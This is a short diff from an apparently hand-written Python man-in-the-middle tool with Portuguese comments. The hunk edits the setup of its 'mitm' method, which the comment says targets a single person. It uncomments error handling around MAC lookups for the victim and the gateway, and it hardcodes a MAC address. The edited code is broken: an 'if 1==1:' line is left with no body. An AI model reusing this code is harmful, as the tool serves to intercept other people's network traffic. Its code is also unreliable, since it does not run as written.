@@ -277,20 +277,20 @@ class homemdomeio:
 
     def mitm(self,VIPadd): #Man in the middle a so uma pessoa
         if 1==1:
-        #try:
+        try:
             VMac = self.getMac(VIPadd)
-        #except:
-        #    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-        #    print(" [!] Djabei!")
-        #    sys.exit(1)
-        #try:
+        except:
+            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+            print(" [!] Djabei!")
+            sys.exit(1)
+        try:
             gateway=input("[*]Qual é o ip de gateway?\n[*]IP:")
             GateMAC = self.getMac(gateway)
             MyGate = "3C:52:82:6A:69:09"
-        #except:
-        #    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-        #    print(" [!] Djabei!")
-        #    sys.exit(1)
+        except:
+            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+            print(" [!] Djabei!")
+            sys.exit(1)
         print(" [+]Starting thread on target:")
         print(VIPadd)
         if 1==1:
